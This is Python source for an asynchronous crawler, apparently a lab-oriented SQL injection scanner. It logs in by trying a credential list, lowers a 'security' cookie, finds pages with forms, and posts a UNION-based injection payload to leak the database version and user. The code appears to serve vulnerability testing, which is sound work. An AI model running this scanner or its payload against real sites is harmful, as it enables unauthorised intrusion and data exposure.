import urllib
import re
import src.utils as utils
import src.scraper as scraper
import src.remote as remote
from .parser import parse, parse_sql_injection_data
from .exceptions import FatalException


# api
def spdr_scope(state):
    # initial state
    if state.target.find('://') == -1:
        state.target = "http://" + state.target
    state.scope = r'https?://' + \
                  re.search(r'//([^/]+)(?:\/|$)', state.target)[1]


def spdr_service_address(state):
    return f"http://{state.service[0]}:{state.service[1]}"


async def spdr_login(url_login, state):
    # authentication
    # TODO: token search based on optional token name

    # parse login for credentials
    # ensure php session id

    print(f"logging in at '{url_login}'")

    scraper_ = scraper.scraper(state)
    response = await scraper_.pull(url_login)
    utils.dump_response(state.verbosity, response)

    scraper_.cookies_sync(response.headers)

    token = None
    try:
        token = parse(response.body,
                      "form input[name='user_token']", "value")[0]
    except Exception:
        raise FatalException("failed to parse login for token")

    for credentials in state.credentials:
        post_data = {
            'Login': 'Login',
            'user_token': token,
            'username': credentials[0],
            'password': credentials[1],
        }
        body = urllib.parse.urlencode(post_data)
        response = await scraper_.push(url_login, body)
        utils.dump_response(state.verbosity, response)
        # TODO: deduce login success / failure beyond response code 200
        if response.code == 200:
            return True

    return False


def spdr_security_override(level, headers, state):

    # override security cookie
    res = utils.cookies_override(headers, "security", level)
    utils.trace(state.verbosity,
                f"{'overrode' if res == 'updated' else 'set'}" +
                " security cookie:")
    utils.trace(state.verbosity, '\n'.join(headers.get_list('cookie')))


async def spdr_inject(url, state):
    # test for sql-injection vulnerability
    utils.trace(state.verbosity,
                f"testing for sql-injection vulnerability on form at '{url}'")

    # attempt injection
    scraper_ = scraper.scraper(state)
    post_data = {
        'id': "-1' UNION SELECT @@version, user() #",
        'Submit': "Submit",
    }
    body = urllib.parse.urlencode(post_data)
    response = await scraper_.push(url, body)
    utils.dump_response(state.verbosity, response)

    result_ = None
    try:
        data = parse_sql_injection_data(response.body, "pre", "name")
        if len(data) > 0:
            result_ = f"{url} | version: {data[0]}, user: {data[1]}"
    except Exception:
        pass

    return result_


def spdr_next_url(state):
    next_ = None
    if len(state.url_pools['unprocessed']) > 0:
        with state.mutex['unprocessed']:
            next_ = state.url_pools['unprocessed'].popleft()
        with state.mutex['processing']:
            state.url_pools['processing'][next_] = 1

    return next_


async def spdr_validate_links(parent, links, state):
    if state.mode != "master":
        raise Exception("invalid mode")

    utils.trace(state.verbosity,
                f"unprocessed: {len(state.url_pools['unprocessed'])}, " +
                f"processing: {len(state.url_pools['processing'])}, " +
                f"processed: {len(state.url_pools['processed'])}, ")
    utils.trace(state.verbosity, f"validating links:\n{links}")

    # fully qualify
    root = re.search(r'(^[^:]*://[^/]+(?:\/|$))', parent)[1]
    links = ['/'.join([root.rstrip('/'), link.lstrip('/')])
             if link.find("://") == -1
             else link for link in links]

    # duplicates
    links = [link for link in links
             if link not in state.url_pools["processed"] and
             link not in state.url_pools["processing"]]

    # scope
    links = [link for link in links
             if re.search(state.scope, link)]

    # blacklist
    def blacklisted(link):
        for s_ in state.blacklist:
            if link.find(s_) > - 1:
                return True
        return False
    links = list(filter(lambda link: not blacklisted(link), links))

    utils.trace(state.verbosity, f"validated links:\n{links}")

    return links


async def spdr_add_links(parent, links, state):

    # TODO: single process GIL -> multi-processing and locks
    if parent:
        # finished processing parent url
        with state.mutex['processing']:
            del state.url_pools['processing'][parent]
        with state.mutex['processed']:
            state.url_pools['processed'][parent] = 1

    links = await spdr_validate_links(parent, links, state)
    with state.mutex['unprocessed']:
        state.url_pools['unprocessed'].extend(links)


async def spdr_process_urls(state):

    scraper_ = scraper.scraper(state)
    if state.mode == "master":
        while len(state.url_pools['unprocessed']) > 0:
            url = spdr_next_url(state)
            links = await scraper_.scrape(url)
            await spdr_add_links(url, links, state)
        print("no work left for master process")
    else:
        client = remote.webclient()
        while True:
            response = await client.pull(
                           f"{spdr_service_address(state)}/next_url")
            if response.code == 200:
                url = response.decode_argument('url')
                links = scraper_.scrape(url)
                body = urllib.parse.urlencode(links)
                response = await client.push(
                               f"{spdr_service_address(state)}/add_links",
                               body)
                if response.code != 200:
                    raise Exception("slave: failed to submit work")
            else:
                print("slave: no work remaining")
                break

    forms = []
    scraper_ = scraper.scraper(state)
    if len(state.url_pools['processed']) > 0:
        for url in state.url_pools['processed']:
            response = await scraper_.pull(url)
            utils.dump_response(state.verbosity, response)
            if len(parse(response.body, 'form')) > 0:
                forms.append(url)

    print(f"crawled site '{state.target}' and found {len(forms)} " +
          f"url{'s' if len(forms) != 1 else ''} with forms to test")

    if len(forms) > 0:
        for url in forms:
            # test for vulnerability
            result_ = await spdr_inject(url, state)
            if result_:
                state.url_pools['vulnerable'].append(result_)
